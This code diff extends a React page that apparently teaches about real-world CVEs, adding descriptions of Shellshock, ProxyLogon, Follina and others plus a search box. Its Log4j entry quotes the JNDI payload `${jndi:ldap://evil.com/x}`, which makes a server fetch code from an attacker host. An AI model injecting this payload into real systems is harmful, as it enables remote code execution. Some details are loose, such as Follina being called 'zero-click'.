@@ -17,7 +17,6 @@ import {
   Copy, 
   Check, 
   BookOpen, 
-  Layers, 
   Terminal, 
   Cpu, 
   CheckCircle2, 
@@ -43,9 +42,9 @@ const CVE_DATA = [
     affected: "Apache Log4j 2.0-beta9 to 2.14.1",
     year: "2021",
     icon: "server",
-    simple: "Log4j is a popular Java logging library. This bug allowed an attacker to type a special string (like \`\${jndi:ldap://evil.com/x}\`) anywhere that gets logged — in usernames, search fields, HTTP headers — and the server would automatically download and run code from the attacker's computer. No login needed.",
+    simple: "Log4j is a popular Java logging library. This bug allowed an attacker to type a special string (like `${jndi:ldap://evil.com/x}`) anywhere that gets logged — in usernames, search fields, HTTP headers — and the server would automatically download and run code from the attacker's computer. No login needed.",
     impact: "Full remote code execution. An attacker could take complete control of any vulnerable server. Affected millions of services including iCloud, Steam, Minecraft, and countless enterprise systems.",
-    fix: "Upgrade to Log4j 2.15.0 or later. Disable JNDI lookups by setting \`log4j2.formatMsgNoLookups=true\`.",
+    fix: "Upgrade to Log4j 2.15.0 or later. Disable JNDI lookups by setting `log4j2.formatMsgNoLookups=true`.",
     refs: "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
   },
   {
@@ -75,14 +74,77 @@ const CVE_DATA = [
     impact: "Exposed private SSL keys, user credentials, and session cookies from millions of HTTPS servers worldwide. Affected Yahoo!, LastPass, Cloudflare, and many banks.",
     fix: "Upgrade to OpenSSL 1.0.1g or 1.0.2. Reissue all SSL certificates and force users to change passwords.",
     refs: "https://nvd.nist.gov/vuln/detail/CVE-2014-0160"
+  },
+  {
+    id: "CVE-2014-6271",
+    name: "Shellshock",
+    category: "Remote Code Execution",
+    severity: "Critical",
+    score: "9.8",
+    affected: "Bash \u2264 4.3 on Linux/Unix/macOS web servers",
+    year: "2014",
+    icon: "server",
+    simple: "Bash is the command-line shell on most Linux servers. CGI web applications set HTTP request headers as environment variables before calling Bash. Shellshock let attackers embed executable code directly inside an HTTP header value — and Bash would blindly run it when parsing the environment variable.",
+    impact: "Immediate RCE on any CGI-based web server running Bash. Attackers could create botnets, steal data, or install backdoors within seconds of exploitation.",
+    fix: "Update Bash to 4.3 patch 25 or later. Disable CGI scripts where possible or migrate to modern application servers.",
+    refs: "https://nvd.nist.gov/vuln/detail/CVE-2014-6271"
+  },
+  {
+    id: "CVE-2020-10148",
+    name: "SolarWinds Orion Auth Bypass",
+    category: "Authentication Bypass",
+    severity: "Critical",
+    score: "9.8",
+    affected: "SolarWinds Orion Platform 2019.4 HF5 \u2013 2020.2.1",
+    year: "2020",
+    icon: "lock",
+    simple: "The SolarWinds Orion IT monitoring platform had a flaw where an attacker could append specific request parameters to API calls and completely skip the authentication layer, getting admin access to the monitoring dashboard without any credentials.",
+    impact: "Leveraged in the massive SolarWinds supply chain attack affecting 18,000+ organizations including US government agencies. Attackers had months of undetected access.",
+    fix: "Apply SolarWinds hotfix 2020.2.1 HF2. Enforce network segmentation to isolate Orion servers from the internet.",
+    refs: "https://nvd.nist.gov/vuln/detail/CVE-2020-10148"
+  },
+  {
+    id: "CVE-2021-26855",
+    name: "ProxyLogon (MS Exchange SSRF)",
+    category: "Server-Side Request Forgery",
+    severity: "Critical",
+    score: "9.8",
+    affected: "Microsoft Exchange Server 2013-2019",
+    year: "2021",
+    icon: "globe",
+    simple: "Microsoft Exchange had an SSRF vulnerability that let attackers send requests to the Exchange back-end as if they were the server itself. Combined with a second bug allowing file writes, attackers could plant a web shell and execute arbitrary commands — all without credentials.",
+    impact: "Exploited by nation-state actors to backdoor 250,000+ Exchange servers worldwide within days of disclosure. Used for espionage and ransomware deployment.",
+    fix: "Apply Microsoft cumulative updates (CUs) for Exchange. Run the EOMT (Exchange On-premises Mitigation Tool) immediately.",
+    refs: "https://nvd.nist.gov/vuln/detail/CVE-2021-26855"
+  },
+  {
+    id: "CVE-2022-30190",
+    name: "Follina (MSDT RCE)",
+    category: "Remote Code Execution",
+    severity: "High",
+    score: "7.8",
+    affected: "Microsoft Office 2013-2021, Windows 7-11",
+    year: "2022",
+    icon: "code",
+    simple: "Office documents can embed URLs that trigger the Microsoft Support Diagnostic Tool (MSDT). Follina abused this to execute PowerShell commands just by opening or previewing a malicious Word document — no macros needed and no prompt shown to the victim.",
+    impact: "Zero-click exploitation via email phishing. Used by threat actors to install infostealers and ransomware against government and enterprise targets worldwide.",
+    fix: "Apply Microsoft patch KB5014697. Disable the MSDT URL protocol via registry as a workaround pending full patch deployment.",
+    refs: "https://nvd.nist.gov/vuln/detail/CVE-2022-30190"
+  },
+  {
+    id: "CVE-2023-23397",
+    name: "Outlook Zero-Click NTLM Theft",
+    category: "Credential Theft",
+    severity: "Critical",
+    score: "9.8",
+    affected: "Microsoft Outlook for Windows (all versions before March 2023 patch)",
+    year: "2023",
+    icon: "lock",
+    simple: "Outlook automatically processes meeting invitations including a custom sound reminder path. By setting that path to a UNC path on an attacker-controlled server, Outlook would connect to it automatically — even before the email was opened — leaking the user's NTLM password hash which could be cracked or relayed.",
+    impact: "Zero user interaction required. Russian APT28 used this to steal credentials from European defense and government organizations for over a year before disclosure.",
+    fix: "Apply Microsoft March 2023 Patch Tuesday update. Add users to the Protected Users Security Group to prevent NTLM authentication.",
+    refs: "https://nvd.nist.gov/vuln/detail/CVE-2023-23397"
   }
-];
-
-// Tech stack support list
-const TECHS = [
-  "JavaScript", "TypeScript", "Python", "PHP", "Java", "C#", "Go", "Rust",
-  "React", "Next.js", "Angular", "Vue", "Express", "Django", "Flask", "Laravel",
-  "Spring Boot", "ASP.NET", "MongoDB", "PostgreSQL", "MySQL", "Redis", "Docker", "Kubernetes"
 ];
 
 // Security Header profiles
@@ -567,7 +629,40 @@ ${selectedV.languages[aiLang]?.vuln || `// Sample ${aiLang} code for ${selectedV
       {/* Tab Content: Real-World CVEs */}
       {activeTab === "cve" && (
         <div className="skh-cve-list">
-          {CVE_DATA.map((cve) => (
+
+          {/* CVE Intelligence Dashboard Banner */}
+          <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(140px, 1fr))", gap: "12px", marginBottom: "24px" }}>
+            {[
+              { label: "Total CVEs", value: CVE_DATA.length, color: "#00f2ff" },
+              { label: "Critical", value: CVE_DATA.filter(c => c.severity === "Critical").length, color: "#ff4d4d" },
+              { label: "High", value: CVE_DATA.filter(c => c.severity === "High").length, color: "#fb923c" },
+              { label: "RCE Class", value: CVE_DATA.filter(c => c.category === "Remote Code Execution").length, color: "#a855f7" },
+            ].map(stat => (
+              <div key={stat.label} style={{ padding: "16px", background: "rgba(10,15,25,0.7)", border: `1px solid ${stat.color}22`, borderLeft: `3px solid ${stat.color}`, borderRadius: "8px" }}>
+                <div style={{ fontFamily: "'Orbitron', sans-serif", fontSize: "1.6rem", fontWeight: 800, color: stat.color, lineHeight: 1 }}>{stat.value}</div>
+                <div style={{ fontSize: "0.72rem", color: "rgba(224,250,255,0.5)", textTransform: "uppercase", letterSpacing: "1px", marginTop: "6px" }}>{stat.label}</div>
+              </div>
+            ))}
+          </div>
+
+          {/* CVE Search */}
+          <div style={{ position: "relative", marginBottom: "20px" }}>
+            <Search size={16} style={{ position: "absolute", left: 14, top: "50%", transform: "translateY(-50%)", color: "rgba(224,250,255,0.4)", pointerEvents: "none" }} />
+            <input
+              type="text"
+              placeholder="Search CVEs by ID, name, or category..."
+              value={searchTerm}
+              onChange={e => setSearchTerm(e.target.value)}
+              style={{ width: "100%", background: "rgba(10,15,25,0.6)", border: "1px solid rgba(0,242,255,0.15)", borderRadius: "8px", padding: "10px 12px 10px 40px", color: "#e6edf3", fontFamily: "'Rajdhani', sans-serif", fontSize: "0.95rem", outline: "none", boxSizing: "border-box" }}
+            />
+          </div>
+
+          {CVE_DATA.filter(cve =>
+            !searchTerm ||
+            cve.id.toLowerCase().includes(searchTerm.toLowerCase()) ||
+            cve.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
+            cve.category.toLowerCase().includes(searchTerm.toLowerCase())
+          ).map((cve) => (
             <div key={cve.id} className="skh-cve-card">
               <div className="skh-cve-header" onClick={() => setOpenCve(openCve === cve.id ? null : cve.id)}>
                 <div className="skh-cve-left">
